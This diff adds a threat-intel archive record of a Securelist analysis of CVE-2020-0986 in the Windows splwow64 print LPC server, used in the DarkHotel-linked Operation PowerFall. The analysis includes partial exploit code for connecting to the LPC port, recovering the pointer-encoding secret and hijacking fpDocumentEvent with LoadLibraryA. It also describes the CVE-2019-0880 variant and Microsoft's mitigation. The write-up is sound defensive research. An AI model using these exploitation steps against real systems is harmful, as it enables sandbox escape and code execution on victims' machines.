@@ -1,0 +1,109 @@
+{
+    "id": "8f4ed61b-d4e3-4ee9-ba73-1285d10e2e3f",
+    "created_at": "2023-01-12T15:09:14.856043Z",
+    "updated_at": "2025-03-27T02:15:41.676586Z",
+    "deleted_at": null,
+    "sha1_hash": "8e304f69ee0fa15fc0ef003821c473045b56e8c1",
+    "title": "2020-09-02 - Operation PowerFall- CVE-2020-0986 and variants",
+    "authors": "",
+    "file_creation_date": "2022-05-28T05:09:42Z",
+    "file_modification_date": "2022-05-28T05:09:42Z",
+    "file_size": 229930,
+    "plain_text": "# Operation PowerFall: CVE-2020-0986 and variants\n\n**[securelist.com/operation-powerfall-cve-2020-0986-and-variants/98329/](https://securelist.com/operation-powerfall-cve-2020-0986-and-variants/98329/)**\n\nAuthors\n\nBoris Larin\n\n[In August 2020, we published a blog post about Operation PowerFall. This targeted attack](https://securelist.com/ie-and-windows-zero-day-operation-powerfall/97976/)\nconsisted of two zero-day exploits: a remote code execution exploit for Internet Explorer 11\nand an elevation of privilege exploit targeting the latest builds of Windows 10. While we\nalready described the exploit for Internet Explorer in the original blog post, we also promised\nto share more details about the elevation of privilege exploit in a follow-up post. Let’s take a\nlook at vulnerability CVE-2020-0986, how it was exploited by attackers, how it was fixed and\nwhat additional mitigations were implemented to complicate exploitation of many other\nsimilar vulnerabilities.\n\n## CVE-2020-0986\n\n[CVE-2020-0986 is an arbitrary pointer dereference vulnerability in GDI Print/Print Spooler](https://docs.microsoft.com/en-us/windows/win32/printdocs/about-the-gdi-print-api)\nAPI. By using this vulnerability it is possible to manipulate the memory of the splwow64.exe\nprocess to achieve execution of arbitrary code in the process and escape the Internet\nExplorer 11 sandbox because splwow64.exe is running with medium integrity level. “Print\n\n\n-----\n\ndriver host for applications, as Microsoft describes splwow64.exe, is a relatively small binary\nthat hosts 64-bit user-mode printer drivers and implements the Local Procedure Call (LPC)\nserver that can be used by other processes to access printing functions. This allows the use\nof 64-bit printer drivers from 32-bit processes. Below I provide the code that can be used to\nspawn splwow64.exe and connect to splwow64.exe’s LPC server.\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n21\n\n22\n\n23\n\n24\n\n\ntypedef struct _PORT_VIEW\n\n{\n\nUINT64 Length;\n\nHANDLE SectionHandle;\n\nUINT64 SectionOffset;\n\nUINT64 ViewSize;\n\nUCHAR* ViewBase;\n\nUCHAR* ViewRemoteBase;\n\n} PORT_VIEW, *PPORT_VIEW;\n\nPORT_VIEW ClientView;\n\ntypedef struct _PORT_MESSAGE_HEADER {\n\nUSHORT DataSize;\n\nUSHORT MessageSize;\n\nUSHORT MessageType;\n\nUSHORT VirtualRangesOffset;\n\nCLIENT_ID ClientId;\n\nUINT64 MessageId;\n\nUINT64 SectionSize;\n\n} PORT_MESSAGE_HEADER, *PPORT_MESSAGE_HEADER;\n\ntypedef struct _PROXY_MSG {\n\nPORT_MESSAGE_HEADER MessageHeader;\n\n\n-----\n\n25\n\n26\n\n27\n\n28\n\n29\n\n30\n\n31\n\n32\n\n33\n\n34\n\n35\n\n36\n\n37\n\n38\n\n39\n\n40\n\n41\n\n42\n\n43\n\n44\n\n45\n\n46\n\n47\n\n48\n\n49\n\n50\n\n51\n\n52\n\n\nUINT64 InputBufSize;\n\nUINT64 InputBuf;\n\nUINT64 OutputBufSize;\n\nUINT64 OutputBuf;\n\nUCHAR Padding[0x1F8];\n\n} PROXY_MSG, *PPORT_MESSAGE;\n\nPROXY_MSG LpcReply;\n\nPROXY_MSG LpcRequest;\n\nint GetPortName(PUNICODE_STRING DestinationString)\n\n{\n\nvoid *tokenHandle;\n\nDWORD sessionId;\n\nULONG length;\n\nint tokenInformation[16];\n\nWCHAR dst[256];\n\nmemset(tokenInformation, 0, sizeof(tokenInformation));\n\nProcessIdToSessionId(GetCurrentProcessId(), &sessionId);\n\nmemset(dst, 0, sizeof(dst));\n\nif (NtOpenProcessToken(GetCurrentProcess(), READ_CONTROL |\nTOKEN_QUERY, &tokenHandle)\n\n|| ZwQueryInformationToken(tokenHandle, TokenStatistics, tokenInformation,\nsizeof(tokenInformation), &length))\n\n{\n\n\n-----\n\n53\n\n54\n\n55\n\n56\n\n57\n\n58\n\n59\n\n60\n\n61\n\n62\n\n63\n\n64\n\n65\n\n66\n\n67\n\n68\n\n69\n\n70\n\n71\n\n72\n\n73\n\n74\n\n75\n\n76\n\n77\n\n78\n\n79\n\n80\n\n\nreturn 0;\n\n}\n\nwsprintfW(\n\ndst,\n\nL\"\\\\RPC Control\\\\UmpdProxy_%x_%x_%x_%x\",\n\nsessionId,\n\ntokenInformation[2],\n\ntokenInformation[3],\n\n0x2000);\n\nRtlInitUnicodeString(DestinationString, dst);\n\nreturn 1;\n\n}\n\nHANDLE CreatePortSharedBuffer(PUNICODE_STRING PortName)\n\n{\n\nHANDLE sectionHandle = 0;\n\nHANDLE portHandle = 0;\n\nunion _LARGE_INTEGER maximumSize;\n\nmaximumSize.QuadPart = 0x20000;\n\nNtCreateSection(&sectionHandle, SECTION_MAP_WRITE |\nSECTION_MAP_READ, 0, &maximumSize, PAGE_READWRITE, SEC_COMMIT,\nNULL);\n\nif (sectionHandle)\n\n{\n\nClientView.SectionHandle = sectionHandle;\n\nClientView.Length = 0x30;\n\n\n-----\n\n81\n\n82\n\n83\n\n84\n\n85\n\n86\n\n87\n\n88\n\n89\n\n90\n\n91\n\n92\n\n93\n\n94\n\n95\n\n96\n\n97\n\n98\n\n99\n\n100\n\n101\n\n102\n\n103\n\n104\n\n105\n\n106\n\n107\n\n108\n\n\nClientView.ViewSize = 0x9000;\n\nZwSecureConnectPort(&portHandle, PortName, NULL, &ClientView, NULL, NULL,\nNULL, NULL, NULL);\n\n}\n\nreturn portHandle;\n\n}\n\nint main()\n\n{\n\nprintf(\"Spawn splwow64.exe\\n\");\n\nCHAR Path[0x100];\n\nGetCurrentDirectoryA(sizeof(Path), Path);\n\nPathAppendA(Path, \"CreateDC.exe\"); // x86 application with call to CreateDC\n\nWinExec(Path, 0);\n\nSleep(1000);\n\nCreateDCW(L\"Microsoft XPS Document Writer\", L\"Microsoft XPS Document Writer\",\nNULL, NULL);\n\nprintf(\"Get port name\\n\");\n\nUNICODE_STRING portName;\n\nif (!GetPortName(&portName))\n\n{\n\nprintf(\"Failed to get port name\\n\");\n\nreturn 0;\n\n}\n\nprintf(\"Create port\\n\");\n\n\n-----\n\n109\n\n110\n\n111\n\n112\n\n\nHANDLE portHandle = CreatePortSharedBuffer(&portName);\n\nif (!(portHandle && ClientView.ViewBase && ClientView.ViewRemoteBase))\n\n{\n\nprintf(\"Failed to create port\\n\");\n\nreturn 0;\n\n}\n\n}\n\n\nTo send data to the LPC server it’s enough to prepare the printer command in the shared\nmemory region and send an LPC message with NtRequestWaitReplyPort().\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n\nmemset(&LpcRequest, 0, sizeof(LpcRequest));\n\nLpcRequest.MessageHeader.DataSize = 0x20;\n\nLpcRequest.MessageHeader.MessageSize = 0x48;\n\nLpcRequest.InputBufSize = 0x88;\n\nLpcRequest.InputBuf = (UINT64)ClientView.ViewRemoteBase; // Points to printer\ncommand\n\nLpcRequest.OutputBufSize = 0x10;\n\nLpcRequest.OutputBuf = (UINT64)ClientView.ViewRemoteBase +\nLpcRequest.InputBufSize;\n\n// TODO: Prepare printer command\n\nNtRequestWaitReplyPort(portHandle, &LpcRequest, &LpcReply);\n\n\nWhen the LPC message is received, it is processed by the function\nTLPCMgr::ProcessRequest(PROXY_MSG *). This function takes LpcRequest as a\nparameter and verifies it. After that it allocates a buffer for the printer command and copies it\nthere from shared memory. The printer command function INDEX, which is used to identify\ndifferent driver functions, is stored as a double word at offset 4 in the printer command\nstructure. Almost a complete list of different function INDEX values can be found in the\n\n\n-----\n\nheader file winddi.h. This header file includes different INDEX values from\nINDEX_DrvEnablePDEV (0) up to INDEX_LAST (103), but the full list of INDEX values does\nnot end there. Analysis of gdi32full.dll reveals that that are a number of special INDEX\nvalues and some of them are provided in the table below (to find them in binary, look for calls\nto PROXYPORT::SendRequest).\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n\n106 – INDEX_LoadDriver\n\n107 - INDEX_UnloadDriver\n\n109 – INDEX_DocumentEvent\n\n110 – INDEX_StartDocPrinterW\n\n111 – INDEX_StartPagePrinter\n\n112 – INDEX_EndPagePrinter\n\n113 – INDEX_EndDocPrinter\n\n114 – INDEX_AbortPrinter\n\n115 – INDEX_ResetPrinterW\n\n116 – INDEX_QueryColorProfile\n\n\nFunction TLPCMgr::ProcessRequest(PROXY_MSG *) checks the function INDEX value and\nif it passes the checks, the printer command will be processed by function GdiPrinterThunk\nin gdi32full.dll.\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n\nif ( IsKernelMsg || INDEX >= 106 && (INDEX <= 107 || INDEX - 109 <= 7))\n\n{\n\n// …\n\nGdiPrinterThunk(LpcRequestInputBuf, LpcRequestOutputBuf,\nLpcRequestOutputBufSize);\n\n}\n\n\nGdiPrinterThunk itself is a very large function that processes more than 60 different function\nINDEX values, and the handler for one of them – namely INDEX_DocumentEvent – contains\nvulnerability CVE-2020-0986. The handler for INDEX_DocumentEvent will use information\nprovided in the printer command (fully controllable from the LPC client) to check that the\ncommand is intended for a printer with a valid handle. After the check it will use the function\nDecodePointer to decode the pointer of the function stored at the fpDocumentEvent global\n\n\n-----\n\nvariable (located in .data segment), then use the decoded pointer to execute the function,\nand finally perform a call to memcpy() where source, destination and size arguments are\nobtained from the printer command and are fully controllable by the attacker.\n\n## Exploitation\n\nIn Windows OS the base addresses of system DLL libraries are randomized with each boot,\naiding exploitation of this vulnerability. The exploit loads the libraries gdi32full.dll and\nwinspool.drv, and then obtains the offset of the fpDocumentEvent pointer from gdi32full.dll\nand the address of the DocumentEvent function from winspool.drv. After that the exploit\nperforms a number of LPC requests with specially crafted INDEX_DocumentEvent\ncommands to leak the value of the fpDocumentEvent pointer. The value of the raw pointer is\n[protected using EncodePointer protection, but the function pointed to by this raw pointer is](https://docs.microsoft.com/en-us/previous-versions/bb432254(v=vs.85))\nexecuted each time the INDEX_DocumentEvent command is sent and the arguments of this\nfunction are fully controllable. All this makes the fpDocumentEvent pointer the best candidate\nfor an overwrite. A necessary step for exploitation is to encode our own pointer in such a\nmanner that it will be properly decoded by the function DecodePointer. Since we have the\nvalue of the encoded pointer and the value of the decoded pointer (address of the\nDocumentEvent function from winspool.drv), we are able to calculate the secret constant\nused for pointer encoding and then use it to encode our own pointer. The necessary\ncalculations are provided below.\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n\n// Calculate secret for pointer encoding\n\nwhile (1)\n\n{\n\nsecret = (unsigned int)DocumentEvent ^ __ROL8__(*\n(UINT64*)leaked_fpDocumentEvent, i & 0x3F);\n\nif ((secret & 0x3F) == i && __ROR8__((UINT64)DocumentEvent ^ secret, secret &\n0x3F) == *(UINT64*)leaked_fpDocumentEvent)\n\nbreak;\n\nif (++i > 0x3F)\n\n{\n\nsecret = 0;\n\nbreak;\n\n}\n\n}\n\n// Encode LoadLibraryA pointer with calculated secret\n\nUINT64 encodedPtr = __ROR8__(secret ^ (UINT64)LoadLibraryA, secret & 0x3F);\n\n\nAt this stage, in order to achieve code execution from the splwow64.exe process, it’s\nsufficient to overwrite the fpDocumentEvent pointer with the encoded pointer of function\nLoadLibraryA and provide the name of a library to load in the next LPC request with the\nINDEX_DocumentEvent command.\n\n\n-----\n\n**_Overview of attack_**\n\n## CVE-2019-0880\n\nAnalysis of CVE-2020-0986 reveals that this vulnerability is the twin brother of the previously\n[discovered CVE-2019-0880. The write-up for CVE-2019-0880 is available here. It’s another](https://byteraptors.github.io/windows/exploitation/2020/05/24/sandboxescape.html)\nvulnerability that was exploited as an in-the-wild zero-day. CVE-2019-0880 is just another\nfully controllable call to memcpy() in the same GdiPrinterThunk function, just a few lines of\ncode away in a handler of function INDEX 118. It seems hard to believe that the developers\ndidn’t notice the existence of a variant for this vulnerability, so why was CVE-2020-0986 not\npatched back then and why did it take so long to fix it? It may not be obvious on first glance,\nbut GdiPrinterThunk is totally broken. Even fixing a couple of calls to memcpy doesn’t really\nhelp.\n\n## Arbitrary pointer dereference host for applications\n\nThe problem lies in the fact that almost every function INDEX in GdiPrinterThunk is\nsusceptible to a potential arbitrary pointer dereference vulnerability. Let’s take a look again at\nthe format of the LPC request message.\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n\ntypedef struct _PROXY_MSG {\n\nPORT_MESSAGE_HEADER MessageHeader;\n\nUINT64 InputBufSize;\n\nUINT64 InputBuf;\n\nUINT64 OutputBufSize;\n\nUINT64 OutputBuf;\n\nUCHAR Padding[0x1F8];\n\n} PROXY_MSG, *PPORT_MESSAGE;\n\n\n_InputBuf and OutputBuf are both pointers that should point to a shared memory region._\n_InputBuf points to a location where the printer command is prepared, and when this_\ncommand is processed by GdiPrinterThunk the result might be written back to the LPC client\nusing the pointer that was provided as OutputBuf. Many handlers for different INDEX values\nprovide data to the LPC client, but the problem is that the pointers InputBuf and OutputBuf\nare fully controllable from the LPC client and manipulation of the OutputBuf pointer can lead\nto an overwrite of splwow64.exe’s process memory.\n\n## How it was mitigated\n\nMicrosoft fixed CVE-2020-0986, but also implemented a mitigation aimed to make\nexploitation of OutputBuf vulnerabilities as hard as possible. Before the patch the function\nFindPrinterHandle() blindly trusted the data provided through the printer command in an LPC\nrequest and it was easy to bypass a valid handle check. After the patch the format of the\nprinter command was changed so it no longer contains the address of the handle table, but\ninstead contains a valid driver ID (quad word at offset 0x18). Now the linked list of handle\ntables is stored inside the splwow64.exe process and the new function\nFindDriverForCookie() uses the provided driver ID to get a handle table securely. For a\nprinter command to be processed it should contain a valid printer handle (quad word at offset\n0x20). The printer handle consists of process ID and the address of the buffer allocated for\nthe printer driver. It is possible to guess some bytes of the printer handle, but a successful\nreal-world brute-force attack on this implementation seems to be unlikely. So, it’s safe to\nassume that this bug class was properly mitigated. However, there are still a couple of places\nin the code where it is possible to write a 0 for the address provided as OutputBuf without a\nhandle check, but exploitation in such a scenario doesn’t appear to be feasible.\n\n[Malware Technologies](https://securelist.com/tag/malware-technologies/)\n[Microsoft Windows](https://securelist.com/tag/microsoft-windows/)\n[Vulnerabilities and exploits](https://securelist.com/tag/vulnerabilities-and-exploits/)\n\n\n-----\n\n[Zero-day vulnerabilities](https://securelist.com/tag/zero-day-vulnerabilities/)\n\nAuthors\n\nBoris Larin\n\nOperation PowerFall: CVE-2020-0986 and variants\n\nYour email address will not be published. Required fields are marked *\n\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-09-02 - Operation PowerFall- CVE-2020-0986 and variants.pdf"
+    ],
+    "report_names": [
+        "2020-09-02 - Operation PowerFall- CVE-2020-0986 and variants.pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
+            "created_at": "2022-10-25T16:07:24.139848Z",
+            "updated_at": "2025-03-27T02:02:10.120505Z",
+            "deleted_at": null,
+            "main_name": "Safe",
+            "aliases": [],
+            "source_name": "ETDA:Safe",
+            "tools": [
+                "DebugView",
+                "LZ77",
+                "OpenDoc",
+                "SafeDisk",
+                "TypeConfig",
+                "UPXShell",
+                "UsbDoc",
+                "UsbExe"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "c0cedde3-5a9b-430f-9b77-e6568307205e",
+            "created_at": "2022-10-25T16:07:23.528994Z",
+            "updated_at": "2025-03-27T02:02:09.847683Z",
+            "deleted_at": null,
+            "main_name": "DarkHotel",
+            "aliases": [
+                "APT-C-06",
+                "ATK 52",
+                "CTG-1948",
+                "Dubnium",
+                "Fallout Team",
+                "Higaisa",
+                "Luder",
+                "Operation DarkHotel",
+                "Operation Daybreak",
+                "Operation Inexsmar",
+                "Operation PowerFall",
+                "Operation The Gh0st Remains the Same",
+                "SIG25",
+                "Shadow Crane",
+                "T-APT-02",
+                "Tungsten Bridge",
+                "Zigzag Hail"
+            ],
+            "source_name": "ETDA:DarkHotel",
+            "tools": [
+                "Asruex",
+                "DarkHotel",
+                "DmaUp3.exe",
+                "GreezeBackdoor",
+                "Karba",
+                "Nemain",
+                "Nemim",
+                "Ramsay",
+                "Retro",
+                "Tapaoux",
+                "Trojan.Win32.Karba.e",
+                "Virus.Win32.Pioneer.dx",
+                "igfxext.exe",
+                "msieckc.exe"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1673536154,
+    "ts_updated_at": 1743041741,
+    "ts_creation_date": 1653714582,
+    "ts_modification_date": 1653714582,
+    "files": {
+        "pdf": "https://archive.orkl.eu/8e304f69ee0fa15fc0ef003821c473045b56e8c1.pdf",
+        "text": "https://archive.orkl.eu/8e304f69ee0fa15fc0ef003821c473045b56e8c1.txt",
+        "img": "https://archive.orkl.eu/8e304f69ee0fa15fc0ef003821c473045b56e8c1.jpg"
+    }
+}
